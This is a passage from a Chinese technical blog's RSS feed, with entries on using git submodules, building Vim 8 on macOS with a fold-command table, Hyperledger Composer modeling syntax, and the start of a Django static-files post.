&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ touch file1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git add file1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git commit
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[master (root-commit) 9132026] Init project 1 with file1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 1 file changed, 0 insertions(+), 0 deletions(-)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         create mode 100644 file1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在p2中添加新文件file2并且push到远程库project2&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ touch file2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git add file2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git commit
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[master (root-commit) 0e07357] Init project2 with file2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 1 file changed, 0 insertions(+), 0 deletions(-)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         create mode 100644 file2&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;3-在开发库p1代码库中添加submodule-project2&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#3-%e5%9c%a8%e5%bc%80%e5%8f%91%e5%ba%93p1%e4%bb%a3%e7%a0%81%e5%ba%93%e4%b8%ad%e6%b7%bb%e5%8a%a0submodule-project2&#34;&gt;
        #
    &lt;/a&gt;
    3. 在开发库p1代码库中添加submodule &amp;lsquo;project2&amp;rsquo;
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;使用submodule add命令添加submodule到当前git代码库中，执行完成后submodule代码也会被clone到对应的目标目录。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git submodule add &amp;lt;URL to submodule remote&amp;gt; &amp;lt;submodule local dir&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git submodule add ../../project2 submodule/p2&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;此时代码已经被拉到本地submodule目录下，查看一下submodule目录已经同步好project2的代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ls
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;file1     submodule
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ls submodule/p2/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;file2&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在project1目录中多出一个&amp;rsquo;.gitmodules&amp;rsquo;文件，该文件包含submodule信息：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat .gitmodules
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[submodule &lt;span style=&#34;font-style:italic&#34;&gt;&amp;#34;submodule/p2&amp;#34;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        path = submodule/p2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        url = /Users/wangq/tmp/submodule/project2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git submodule
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 0e0735740297cce3ef051c9c84d20d032d03311a submodule/p2 (heads/master)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这时候需要添加初始化一下这个submodule&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git submodule init
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git submodule update&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;初始化后在主代码库目录中可以查看到submodule相关的两个改动，这两个改动可以被commit。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git status
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;On branch master
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Your branch is up-to-date with &lt;span style=&#34;font-style:italic&#34;&gt;&amp;#39;origin/master&amp;#39;&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Changes to be committed:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  (use &lt;span style=&#34;font-style:italic&#34;&gt;&amp;#34;git reset HEAD &amp;lt;file&amp;gt;...&amp;#34;&lt;/span&gt; to unstage)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          new file:   .gitmodules
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          new file:   submodule/p2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git commit
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[master 5d40507] Create submodule inside p1&lt;span style=&#34;&#34;&gt;&amp;#39;&lt;/span&gt;s working repository
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 2 files changed, 4 insertions(+)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         create mode 100644 .gitmodules
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         create mode 160000 submodule/p2&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;4-此时如果project2的开发人员更新了project2的代码我们可以把最新的代码同步到submodule中&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#4-%e6%ad%a4%e6%97%b6%e5%a6%82%e6%9e%9cproject2%e7%9a%84%e5%bc%80%e5%8f%91%e4%ba%ba%e5%91%98%e6%9b%b4%e6%96%b0%e4%ba%86project2%e7%9a%84%e4%bb%a3%e7%a0%81%e6%88%91%e4%bb%ac%e5%8f%af%e4%bb%a5%e6%8a%8a%e6%9c%80%e6%96%b0%e7%9a%84%e4%bb%a3%e7%a0%81%e5%90%8c%e6%ad%a5%e5%88%b0submodule%e4%b8%ad&#34;&gt;
        #
    &lt;/a&gt;
    4. 此时如果project2的开发人员更新了project2的代码，我们可以把最新的代码同步到submodule中
&lt;/div&gt;
&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git pull
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;remote: Counting objects: 3, &lt;span style=&#34;font-weight:bold&#34;&gt;done&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;remote: Compressing objects: 100% (2/2), &lt;span style=&#34;font-weight:bold&#34;&gt;done&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;remote: Total 3 (delta 0), reused 0 (delta 0)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Unpacking objects: 100% (3/3), &lt;span style=&#34;font-weight:bold&#34;&gt;done&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;From /Users/wangq/tmp/submodule/project2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0e07357..db4f02b  master     -&amp;gt; origin/master
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Updating 0e07357..db4f02b
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Fast-forward
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; file2 | 1 +
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 1 file changed, 1 insertion(+)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;查看一下其他人的改动内容如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat file2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;This line is change from another&lt;span style=&#34;&#34;&gt;&amp;#39;&lt;/span&gt;s working reposiroty&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;5在p1中的submodule对project2进行了修改后也可以把新的修改发不到project2的远程库这样project2的开发人员可以同步到最新的代码&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#5%e5%9c%a8p1%e4%b8%ad%e7%9a%84submodule%e5%af%b9project2%e8%bf%9b%e8%a1%8c%e4%ba%86%e4%bf%ae%e6%94%b9%e5%90%8e%e4%b9%9f%e5%8f%af%e4%bb%a5%e6%8a%8a%e6%96%b0%e7%9a%84%e4%bf%ae%e6%94%b9%e5%8f%91%e4%b8%8d%e5%88%b0project2%e7%9a%84%e8%bf%9c%e7%a8%8b%e5%ba%93%e8%bf%99%e6%a0%b7project2%e7%9a%84%e5%bc%80%e5%8f%91%e4%ba%ba%e5%91%98%e5%8f%af%e4%bb%a5%e5%90%8c%e6%ad%a5%e5%88%b0%e6%9c%80%e6%96%b0%e7%9a%84%e4%bb%a3%e7%a0%81&#34;&gt;
        #
    &lt;/a&gt;
    5.在p1中的submodule对project2进行了修改后也可以把新的修改发不到project2的远程库，这样project2的开发人员可以同步到最新的代码。
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;在p1的submodule目录中对p2进行修改并本地提交，然后把submodule的修改推到project2远程库中：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git push origin master
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Counting objects: 3, &lt;span style=&#34;font-weight:bold&#34;&gt;done&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Delta compression using up to 4 threads.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Compressing objects: 100% (2/2), &lt;span style=&#34;font-weight:bold&#34;&gt;done&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Writing objects: 100% (3/3), 335 bytes | 111.00 KiB/s, &lt;span style=&#34;font-weight:bold&#34;&gt;done&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Total 3 (delta 0), reused 0 (delta 0)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;To /Users/wangq/tmp/submodule/project2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   db4f02b..f600361  master -&amp;gt; master&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这是project2的其他开发人员可以在自己的代码库中同步这部分修改内容：
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git pull origin master
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;remote: Counting objects: 3, &lt;span style=&#34;font-weight:bold&#34;&gt;done&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;remote: Compressing objects: 100% (2/2), &lt;span style=&#34;font-weight:bold&#34;&gt;done&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;remote: Total 3 (delta 0), reused 0 (delta 0)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Unpacking objects: 100% (3/3), &lt;span style=&#34;font-weight:bold&#34;&gt;done&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;From /Users/wangq/tmp/submodule/test/../project2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; * branch            master     -&amp;gt; FETCH_HEAD
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   db4f02b..f600361  master     -&amp;gt; origin/master
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Updating db4f02b..f600361
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Fast-forward
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; file2 | 1 +
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 1 file changed, 1 insertion(+)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;查看修改内容：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat file2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;This line is change from another&lt;span style=&#34;font-style:italic&#34;&gt;&amp;#39;s working reposiroty
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;This line is chaneg from p1&amp;#39;&lt;/span&gt;s submodule repository      &amp;lt;-- 这一行是p1开发人员增加的内容&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;使用中碰到的问题&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bd%bf%e7%94%a8%e4%b8%ad%e7%a2%b0%e5%88%b0%e7%9a%84%e9%97%ae%e9%a2%98&#34;&gt;
        #
    &lt;/a&gt;
    使用中碰到的问题
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;trap-1-server-does-not-allow-request-for-unadvertised-object&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#trap-1-server-does-not-allow-request-for-unadvertised-object&#34;&gt;
        ##
    &lt;/a&gt;
    Trap 1: &amp;ldquo;Server does not allow request for unadvertised object&amp;rdquo;
&lt;/div&gt;
&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git submodule update --checkout
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;error: Server does not allow request &lt;span style=&#34;font-weight:bold&#34;&gt;for&lt;/span&gt; unadvertised object 55e720e9c4ca96ae1d1bde84a1db3a12c90b9700
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Fetched in submodule path &lt;span style=&#34;font-style:italic&#34;&gt;&amp;#39;submodule/p2&amp;#39;&lt;/span&gt;, but it did not contain 55e720e9c4ca96ae1d1bde84a1db3a12c90b9700. Direct fetching of that commit failed.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;原因：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;出现这个问题的原因是在submodule中进行的修改虽然已经commit到了superproject中，甚至是push到了superproject的远程库，但是当另外一个人尝试把这个superproject抓下来并同步这个submodule中的修改时，如果submodule的改动并未push到其对应的remote库，那么就会出现这个问题，因为update尝试从sudmobule的远程库pull对应的改动(55e720e9c4ca96ae1d1bde84a1db3a12c90b9700)，而这个改动并未被push到远程库，因此也就不存在。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Vim 8 Mac</title>
      <link>/2017/11/vim-8-mac/</link>
      <pubDate>Mon, 20 Nov 2017 00:08:15 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/11/vim-8-mac/</guid>
      <description>&lt;h2 id=&#34;安装vim8&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%89%e8%a3%85vim8&#34;&gt;
        #
    &lt;/a&gt;
    安装vim8
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;$ xcode-select --install
$ ./configure --enable-luainterp=yes --enable-perlinterp=yes --enable-pythoninterp=yes --enable-tclinterp=yes --enable-rubyinterp=yes --enable-cscope --with-lua-prefix=/usr/local --enable-terminal --enable-multibyte --with-features=huge
$ make
$ make install
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;安装插件&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%89%e8%a3%85%e6%8f%92%e4%bb%b6&#34;&gt;
        #
    &lt;/a&gt;
    安装插件
&lt;/div&gt;
&lt;/h2&gt;
&lt;h2 id=&#34;安装youcompleteme&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%89%e8%a3%85youcompleteme&#34;&gt;
        #
    &lt;/a&gt;
    安装YouCompleteMe:
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;$ ./install.py --clang-completer --go-completer --js-completer
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;vim-folding&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#vim-folding&#34;&gt;
        #
    &lt;/a&gt;
    vim folding
&lt;/div&gt;
&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;命令&lt;/th&gt;
&lt;th&gt;功能&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;za&lt;/td&gt;
&lt;td&gt;打开/关闭当前的折叠&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zc&lt;/td&gt;
&lt;td&gt;关闭当前打开的折叠&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zo&lt;/td&gt;
&lt;td&gt;打开当前的折叠&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zm&lt;/td&gt;
&lt;td&gt;关闭所有折叠&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zM&lt;/td&gt;
&lt;td&gt;关闭所有折叠及其嵌套的折叠&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zr&lt;/td&gt;
&lt;td&gt;打开所有折叠&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zR&lt;/td&gt;
&lt;td&gt;打开所有折叠及其嵌套的折叠&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zd&lt;/td&gt;
&lt;td&gt;删除当前折叠&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zE&lt;/td&gt;
&lt;td&gt;删除所有折叠&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zj&lt;/td&gt;
&lt;td&gt;移动至下一个折叠&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zk&lt;/td&gt;
&lt;td&gt;移动至上一个折叠&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zn&lt;/td&gt;
&lt;td&gt;禁用折叠&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zN&lt;/td&gt;
&lt;td&gt;启用折叠&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;issues&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#issues&#34;&gt;
        #
    &lt;/a&gt;
    Issues
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;macos-iterm启动vim后第一行显示p字符&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#macos-iterm%e5%90%af%e5%8a%a8vim%e5%90%8e%e7%ac%ac%e4%b8%80%e8%a1%8c%e6%98%be%e7%a4%bap%e5%ad%97%e7%ac%a6&#34;&gt;
        ##
    &lt;/a&gt;
    macos iTerm启动vim后第一行显示&amp;rsquo;$p&amp;rsquo;字符
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;解决方法：把终端类型从xterm或者xterm-256color改为linux&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Hyperledger Intro</title>
      <link>/2017/11/hyperledger-intro/</link>
      <pubDate>Thu, 16 Nov 2017 17:23:21 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/11/hyperledger-intro/</guid>
      <description>&lt;p&gt;Hyperledger项目：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Hyperledger Fabric&lt;/li&gt;
&lt;li&gt;Hyperledger Sawtooth&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://hyperledger.github.io/composer/&#34;&gt;Hyperledger Composer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;模型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Assets(资产)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般定义方式：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	/**
	 * A vehicle asset.
	 */
	asset Vehicle identified by vin {
	  o String vin
	}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;继承方式：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	/**
	 * A car asset. A car is related to a list of parts
	 */
	asset Car extends Vehicle {
	  o String model
	  --&amp;gt; Part[] Parts
	}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;抽象方式：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	/**
	* An abstract Vehicle asset.
	*/
	abstract asset Vehicle identified by vin {
	  o String vin
	}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Participants(参与者)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  /**
  * An enumerated type
  */
  enum ProductType {
  o DAIRY
  o BEEF
  o VEGETABLES
  }
  participant Farmer identified by farmerId {
      o String farmerId
      o ProductType primaryProduct
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Transactions(事务)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Concepts(概念)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  abstract concept Address {
    o String street
    o String city default =&amp;quot;Winchester&amp;quot;
    o String country default = &amp;quot;UK&amp;quot;
    o Integer[] counts optional
  }

  concept UnitedStatesAddress extends Address {
    o String zipcode
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;http://www.8btc.com/blockchain-poc-hyperledger&#34;&gt;http://www.8btc.com/blockchain-poc-hyperledger&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Test:&lt;/p&gt;
&lt;p&gt;概念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BND: business network definition (BND)&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Django静态文件配置</title>
      <link>/2017/11/django%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Thu, 16 Nov 2017 16:23:13 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/11/django%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE/</guid>
      <description>&lt;p&gt;配置项：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;配置项&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;th&gt;例子&lt;/th&gt;
&lt;/tr&gt;
